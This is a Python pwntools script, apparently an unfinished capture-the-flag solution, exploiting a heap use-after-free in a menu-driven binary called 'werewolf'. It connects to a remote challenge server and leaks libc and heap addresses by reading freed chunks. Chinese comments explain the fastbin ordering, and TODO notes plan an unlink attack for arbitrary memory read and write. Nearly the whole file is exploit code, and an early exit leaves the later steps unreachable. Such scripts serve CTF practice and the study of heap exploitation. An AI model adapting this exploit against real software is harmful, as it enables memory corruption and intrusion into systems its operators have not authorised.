#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './werewolf'

class Operator:
    def __init__(self, io):
        self.io = io
    
    def add(self, size, content):
        self.io.sendlineafter('Exit\n', '1')
        self.io.sendlineafter('size:\n', str(size))
        if len(content) < size:
            self.io.sendlineafter('action:\n', content)
        else:
            self.io.sendafter('action:\n', content)

    def show(self, idx):
        self.io.sendlineafter('Exit\n', '2')
        self.io.sendlineafter('id\n', str(idx))
        self.io.recvuntil('action : ')
        return self.io.recvuntil('\n===========', drop=True)

    def edit(self, idx, content):
        self.io.sendlineafter('Exit\n', '3')
        self.io.sendlineafter('id\n', str(idx))
        self.io.sendlineafter('action\n', content)

    def kill(self, idx):
        self.io.sendlineafter('Exit\n', '4')
        self.io.sendlineafter('id\n', str(idx))

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('106.75.66.195', 11002)

malloc_length = 0x100
op = Operator(io)

log.info('TODO: Leak libc address:')
op.add(malloc_length * 2, '0' * malloc_length)  # idx 0
# op.add(malloc_length, 'd' * malloc_length)  # idx 3
op.kill(0)
data = op.show(0)
print(repr(data))

io.interactive()
sys.exit(0)
log.info('TODO: Leak heap address:')
op.add(0x10, 'a' * 0x10)  # idx 0
op.add(0x10, 'b' * 0x10)  # idx 1
op.kill(1)
op.kill(0)
heap_addr_str = op.show(0)
# 这里采用先释放1再释放0来构造fastbin
# 因为本机调试时，0块总是出现00结尾的情况
# 如果先释放0再释放1导致输出被截断
# 无法泄漏地址
if len(heap_addr_str) != 6:
    log.error('Cannot get heap address. please try again!')
    sys.exit(-1)
heap_addr = u64(heap_addr_str.ljust(8, '\x00'))
# 0x5564f0ec5320 - 0x5564f0ec5250 = 0xd0
role_base_chunk_addr = heap_addr - 0xd0
log.success('heap_addr = %s', hex(heap_addr))
log.success('role_base_chunk_addr = %s', hex(role_base_chunk_addr))



# op.kill(3)
log.info('TODO: Unlink and READ/WRITE anywhere:')


# op.kill(2)
# op.kill(3)
# op.add(malloc_length * 2 + 0x10, )

io.interactive()
